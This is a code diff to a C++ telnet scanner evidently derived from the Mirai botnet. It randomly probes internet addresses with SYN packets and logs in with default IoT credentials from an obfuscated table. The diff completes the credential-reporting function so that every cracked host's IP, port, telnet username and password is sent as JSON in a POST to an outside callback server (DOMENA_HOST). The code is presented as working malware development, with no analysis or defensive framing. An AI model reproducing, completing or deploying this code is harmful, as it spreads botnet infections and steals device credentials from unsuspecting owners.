@@ -17,9 +17,15 @@
 #include <unistd.h>
 
 #include "utils.hpp"
+#include "net/request.hpp"
 #include "../env.hpp"
 
 #define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))
+
+struct net_address {
+  uint32_t net_order_addr;
+  std::string str_addr;
+};
 
 struct scanner_auth {
   char * username;
@@ -131,6 +137,7 @@ class Scanner {
         struct scanner_connection * conn;
         struct timeval tim;
         int last_spew, mfd_rd = 0, mfd_wr = 0, nfds;
+        net_address random_address = get_random_ip();
 
         // Spew out SYN to try and get a response.
         if (fake_time != last_spew) {
@@ -143,7 +150,7 @@ class Scanner {
 
             iph->id = rand_next();
             iph->saddr = LOCAL_ADDR;
-            iph->daddr = get_random_ip();
+            iph->daddr = random_address.net_order_addr;
             iph->check = 0;
             iph->check = checksum_generic((uint16_t *) iph, sizeof(struct iphdr));
 
@@ -445,12 +452,14 @@ class Scanner {
                   break;
                 case scanner_connection::SC_WAITING_SH_RESP:
                   if ((consumed = consume_any_prompt(conn)) > 0) {
-                    char *tmp_str;
+                    char * tmp_str;
                     int tmp_len;
 
                     #if defined(TALK)
                     printf("FD%d received sh prompt\n", conn->fd);
                     #endif
+
+                    report_working(random_address.str_addr, conn->dst_port, conn->auth);
 
                     // Send query string
                     tmp_str = (char *) O("/bin/busybox XENA");
@@ -485,7 +494,7 @@ class Scanner {
                     #if defined(TALK)
                     printf("FD%d Found verified working telnet\n", conn->fd);
                     #endif
-                    report_working(conn->dst_addr, conn->dst_port, conn->auth);
+                    report_working(random_address.str_addr, conn->dst_port, conn->auth);
                     close(conn->fd);
                     conn->fd = -1;
                     conn->state = scanner_connection::SC_CLOSED;
@@ -573,6 +582,7 @@ class Scanner {
       add_auth_entry((char*) O("telekom"), (char*) O("1234567"), 1);
       add_auth_entry((char*) O("telekom"), (char*) O("12345678"), 1);
       add_auth_entry((char*) O("telekom"), (char*) O("123456789"), 1);
+      add_auth_entry((char*) O("username"), (char*) O("password"), 1);
     }
 
     void rand_init () {
@@ -595,70 +605,41 @@ class Scanner {
     }
 
     /* Valid credentials found. */
-    void report_working (uint32_t daddr, uint16_t dport, struct scanner_auth * auth) {
-      /*
-        TODO!
-        Make a HTTP request to somewhere and tell your thing.
-        TODO!
-      */
-
-      /*
-      struct sockaddr_in addr;
-      int pid = fork(), fd;
-      struct resolv_entries *entries = NULL;
-
-      if (pid > 0 || pid == -1)
-        return;
-
-      if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
-        #if defined(TALK)
-        printf("[report] Failed to call socket()\n");
-        #endif
-        exit(0);
-      }
-
-      table_unlock_val(TABLE_SCAN_CB_DOMAIN);
-      table_unlock_val(TABLE_SCAN_CB_PORT);
-
-      entries = resolv_lookup(table_retrieve_val(TABLE_SCAN_CB_DOMAIN, NULL));
-      if (entries == NULL) {
-        #if defined(TALK)
-        printf("[report] Failed to resolve report address\n");
-        #endif
-        return;
-      }
-      addr.sin_family = AF_INET;
-      addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
-      addr.sin_port = *((port_t *)table_retrieve_val(TABLE_SCAN_CB_PORT, NULL));
-      resolv_entries_free(entries);
-
-      table_lock_val(TABLE_SCAN_CB_DOMAIN);
-      table_lock_val(TABLE_SCAN_CB_PORT);
-
-      if (connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) {
-        #if defined(TALK)
-        printf("[report] Failed to connect to scanner callback!\n");
-        #endif
-        close(fd);
-        exit(0);
-      }
-
-      uint8_t zero = 0;
-      send(fd, &zero, sizeof(uint8_t), MSG_NOSIGNAL);
-      send(fd, &daddr, sizeof(ipv4_t), MSG_NOSIGNAL);
-      send(fd, &dport, sizeof(uint16_t), MSG_NOSIGNAL);
-      send(fd, &(auth->username_len), sizeof(uint8_t), MSG_NOSIGNAL);
-      send(fd, auth->username, auth->username_len, MSG_NOSIGNAL);
-      send(fd, &(auth->password_len), sizeof(uint8_t), MSG_NOSIGNAL);
-      send(fd, auth->password, auth->password_len, MSG_NOSIGNAL);
-
+    void report_working (std::string address, uint16_t port, struct scanner_auth * auth) {
       #if defined(TALK)
-      printf("[report] Send scan result to loader\n");
+      std::cout << "Telnet credentials found -> " << address << ":" << port << " -> " << auth->username << " | " << auth->password << std::endl;
       #endif
 
-      close(fd);
-      exit(0);
-      */
+      std::string payload = "";
+      payload += O("{\"address\":\"");
+      payload += address;
+      payload += O("\",\"port\":\"");
+      payload += std::to_string(port);
+      payload += O("\",\"details\":{");
+      payload += O("\"telnetUsername\":\"");
+      payload += auth->username;
+      payload += O("\",\"telnetPassword\":\"");
+      payload += auth->password;
+      payload += O("\"}");
+      payload += O("}");
+
+      Request req {
+        DOMENA_HOST,
+        DOMENA_PORT,
+        O("/v1/services"),
+        DOMENA_SSL,
+        O("POST"),
+        payload,
+      };
+
+      try {
+        req.exec();
+      } catch (const char * message) {
+        #if defined(TALK)
+        std::cout << "Failed to report found credentials." << std::endl; 
+        std::cout << message << std::endl;
+        #endif
+      }
     }
 
     int consume_resp_prompt (struct scanner_connection * conn) {
@@ -898,7 +879,7 @@ class Scanner {
       return ret;
     }
 
-    uint32_t get_random_ip () {
+    net_address get_random_ip () {
       uint32_t tmp;
       uint8_t o1, o2, o3, o4;
 
@@ -930,7 +911,10 @@ class Scanner {
         || (o1 >= 224)
       );
 
-      return INET_ADDR(o1, o2, o3, o4);
+      net_address n;
+      n.net_order_addr = INET_ADDR(o1, o2, o3, o4);
+      n.str_addr = std::to_string(o1) + "." + std::to_string(o2) + "." + std::to_string(o3) + "." + std::to_string(o4);
+      return n;
     }
 
     void add_auth_entry (char * user, char * pass, uint16_t weight) {
